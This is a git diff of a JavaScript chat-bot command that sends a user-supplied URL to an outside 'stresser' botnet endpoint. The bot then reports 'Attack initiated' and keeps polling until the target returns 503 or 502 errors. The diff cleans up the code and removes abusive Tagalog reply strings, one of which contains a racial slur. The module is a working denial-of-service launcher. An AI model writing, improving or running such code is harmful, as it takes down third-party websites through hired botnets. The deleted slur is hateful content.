@@ -1,7 +1,7 @@
 const axios = require('axios');
 
 const apiEndpoints = [
-   "http://sgp1.hmvhostings.com:25694/stresser"
+  "http://sgp1.hmvhostings.com:25694/stresser"
 ];
 
 module.exports.config = {
@@ -20,24 +20,23 @@ module.exports.run = async ({ args, chat, font }) => {
   const targetUrl = args[0];
 
   if (!targetUrl) {
-    return chat.reply(font.thin('Please Provide URL to ATTACK!'));
+    return chat.reply(font.thin('Please provide a URL to attack!'));
   }
 
   const preparingMessage = await chat.reply(font.bold('Preparing to attack target...'));
 
   const tryAttack = async (apis, index = 0) => {
     if (index >= apis.length) {
-      preparingMessage.delete();
-      return chat.reply(font.thin('All BOTNET are currently busy, try again later after all attack finished!'));
+      await preparingMessage.delete();
+      return chat.reply(font.thin('All BOTNETs are currently busy, try again later after all attacks are finished!'));
     }
 
     try {
       const response = await axios.get(`${apis[index]}?url=${encodeURIComponent(targetUrl)}`);
+      await preparingMessage.delete();
+      await chat.reply(font.thin(response.data.message || 'Attack initiated successfully!'));
 
-      preparingMessage.delete();
-      chat.reply(font.thin(response.data.message || 'Attack initiated successfully!'));
-
-      let errorMessageSent = false; 
+      let errorMessageSent = false;
 
       const attackInterval = setInterval(async () => {
         try {
@@ -45,11 +44,11 @@ module.exports.run = async ({ args, chat, font }) => {
         } catch (error) {
           if (error.response && !errorMessageSent) {
             if (error.response.status === 503) {
-              chat.reply(font.thin('Ako importante? putah! Service Unavailable (503).'));
+              await chat.reply(font.thin('Service Unavailable (503).'));
               errorMessageSent = true;
               clearInterval(attackInterval);
             } else if (error.response.status === 502) {
-              chat.reply(font.thin('Kamusta negrong may ari bersyong pangalawa! Bad Gateway (502).'));
+              await chat.reply(font.thin('Bad Gateway (502).'));
               errorMessageSent = true;
               clearInterval(attackInterval);
             }
